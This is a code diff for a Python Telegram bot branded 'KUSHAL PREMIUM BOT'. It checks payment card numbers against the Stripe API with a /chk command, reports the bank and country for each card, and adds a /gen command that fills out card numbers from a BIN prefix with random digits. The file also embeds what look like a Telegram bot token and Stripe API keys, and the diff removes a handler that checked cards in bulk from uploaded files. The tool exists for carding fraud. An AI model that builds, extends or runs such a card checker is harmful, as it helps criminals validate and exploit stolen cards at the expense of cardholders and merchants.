@@ -4,11 +4,12 @@ import threading
 import telebot
 import requests
 import time
+import random
 from flask import Flask
 
 # CONFIG
 API_TOKEN = '8744594607:AAGXRJnxQ_ylxbQO40sAQYigA5n1refYgY4'
-SECRET_KEY = "rk_test_51Toge60PPaNM3lnKN6oFr6JU6P4lrTtzwComE7wc6e1Nmy4BdUK2qYEKGxmNUQGbxlRkiw0ZujH1Dcu8hcvi0JZp00qtqZ7rfl"
+SECRET_KEY = "sk_test_51Toge60PPaNM3lnKldVYOSTT8QFsujYTHJ02OfDWqo82B1okdG9vYItCp6bQvLcFGqCkYcQyOHgSMFLQFRQab2lz00H80IHrEc"
 ANIMATION_URL = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9tYyG2cKc/giphy.gif"
 
 logging.basicConfig(level=logging.INFO)
@@ -27,19 +28,22 @@ def get_bin_info(cc):
         }
     except: return {"bank": "N/A", "type": "N/A", "country": "N/A"}
 
-# FORMATTING
-def get_format(cc, mm, yy, cvc, status, gate, bin_info, user_name, error_msg):
+# FORMATTING - Updated with your requested design and User Name
+def get_format(cc, mm, yy, cvc, status, gate, bin_info, user_name, user_id, error_msg):
     icon = "✅" if status == "Approved" else "❌"
+    status_text = "Approved" if status == "Approved" else "Declined/Maintenance 🛠"
     return (
-        f"💳 𝗖𝗖 : <code>{cc}|{mm}|{yy}|{cvc}</code>\n"
-        f"Status: {status} {icon}\n"
-        f"Response: {error_msg}\n"
-        f"Gateway: {gate}\n"
-        f"Bank: {bin_info.get('bank', 'N/A')}\n"
-        f"Type: {bin_info.get('type', 'N/A')}\n"
-        f"Country: {bin_info.get('country', 'N/A')}\n"
-        f"Checked by: @{user_name}\n"
-        f"Credits left: Unlimited"
+        f"💳 CC: <code>{cc}|{mm}|{yy}|{cvc}</code>\n"
+        f"📡 Status: {status_text} {icon}\n"
+        f"📝 Response: {error_msg}\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"🏦 Bank: {bin_info.get('bank', 'N/A')}\n"
+        f"🌍 Country: {bin_info.get('country', 'N/A')}\n"
+        f"🛠 Gateway: {gate}\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"👤 Checked by: {user_name}\n"
+        f"🆔 ID: {user_id}\n"
+        f"━━━━━━━━━━━━━━"
     )
 
 # CHECKER LOGIC
@@ -48,7 +52,7 @@ def check_cc(cc, mm, yy, cvc):
     headers = {"Authorization": f"Bearer {SECRET_KEY}"}
     data = {"card[number]": cc, "card[exp_month]": mm, "card[exp_year]": yy, "card[cvc]": cvc}
     try:
-        res = requests.post(url, headers=headers, data=data).json()
+        res = requests.post(url, headers=headers, data=data, timeout=10).json()
         bin_info = get_bin_info(cc)
         if "error" in res: return "Declined", bin_info, res['error'].get('message', 'Declined')
         return "Approved", bin_info, "Card Approved"
@@ -58,45 +62,32 @@ def check_cc(cc, mm, yy, cvc):
 @bot.message_handler(commands=['start'])
 def start(message):
     loading = bot.send_animation(message.chat.id, animation=ANIMATION_URL)
-    bot.delete_message(message.chat.id, message.message_id)
     time.sleep(2.5)
     bot.delete_message(message.chat.id, loading.message_id)
-    bot.send_message(message.chat.id, "✨ *Welcome to KUSHAL PREMIUM BOT* ✨\n\nCommands:\n/chk cc|mm|yy|cvc - Check Card\n/st - Check Status", parse_mode="Markdown")
+    bot.send_message(message.chat.id, "✨ *Welcome to KUSHAL PREMIUM BOT* ✨\n\nCommands:\n/chk cc|mm|yy|cvc - Check Card\n/gen bin - Generate\n/st - Check Status", parse_mode="Markdown")
 
-@bot.message_handler(commands=['chk'])
+@bot.message_handler(commands=['chk', 'st'])
 def chk(message):
     try:
         data = message.text.split(' ', 1)[1]
         parts = data.replace('|', ':').replace('/', ':').split(':')
         status, bin_info, err = check_cc(parts[0], parts[1], parts[2], parts[3])
-        msg = get_format(parts[0], parts[1], parts[2], parts[3], status, "Stripe", bin_info, message.from_user.username or "User", err)
+        msg = get_format(parts[0], parts[1], parts[2], parts[3], status, "Stripe", bin_info, message.from_user.first_name, message.from_user.id, err)
         bot.reply_to(message, msg, parse_mode="HTML")
-    except: bot.reply_to(message, "⚠️ Format error! Use: `/chk cc|mm|yy|cvc`", parse_mode="Markdown")
+    except: bot.reply_to(message, "⚠️ Format error! Use: `.chk cc|mm|yy|cvc`")
 
-@bot.message_handler(commands=['st'])
-def st(message):
-    bot.reply_to(message, "🚀 Status: ONLINE ✅\n💎 Mode: KUSHAL PREMIUM\n🤖 UptimeRobot: MONITORING ACTIVE")
+@bot.message_handler(commands=['gen'])
+def gen(message):
+    try:
+        bin_code = message.text.split(' ')[1]
+        cc = bin_code + ''.join([str(random.randint(0, 9)) for _ in range(16 - len(bin_code))])
+        bot.reply_to(message, f"💳 Generated: <code>{cc}|12|2027|000</code>", parse_mode="HTML")
+    except: bot.reply_to(message, "⚠️ Use: `.gen 465828`")
 
-# FILE PROCESSING
-@bot.message_handler(content_types=['document'])
-def handle_docs(message):
-    file_info = bot.get_file(message.document.file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
-    lines = downloaded_file.decode('utf-8').splitlines()
-    for line in lines:
-        try:
-            parts = line.replace('|', ':').replace(';', ':').split(':')
-            status, bin_info, err = check_cc(parts[0], parts[1], parts[2], parts[3])
-            msg = get_format(parts[0], parts[1], parts[2], parts[3], status, "Stripe", bin_info, message.from_user.username or "User", err)
-            bot.reply_to(message, msg, parse_mode="HTML")
-        except: continue
-
-# WEB SERVER FOR UPTIMEROBOT
+# WEB SERVER
 @app.route('/')
-def home(): return "KUSHAL BOT IS RUNNING AND MONITORED BY UPTIMEROBOT"
+def home(): return "KUSHAL BOT IS ACTIVE"
 
 if __name__ == '__main__':
-    # Flask thread (UptimeRobot ke liye)
     threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))), daemon=True).start()
-    # Bot polling
     bot.infinity_polling()
